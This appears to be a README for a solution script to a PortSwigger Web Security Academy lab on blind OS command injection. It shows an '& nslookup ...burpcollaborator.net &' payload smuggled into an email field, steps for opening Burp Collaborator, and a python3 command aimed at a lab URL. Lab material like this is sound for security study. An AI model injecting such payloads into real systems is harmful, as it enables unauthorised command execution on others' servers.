# How to run script.py

### & nslookup 8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &

Open Burp Collaborator: Open Burp Suite -> Click Burp (top left button) -> Click Burp Collaborator Client -> Click Copy to clipboard -> Now Burp Collaborator Server is running and waiting for requests

Replace the [0-9a-z]{30}.burpcollaborator.net address with the copied one

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test@test.com& nslookup 8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &" -p 127.0.0.1:8080`
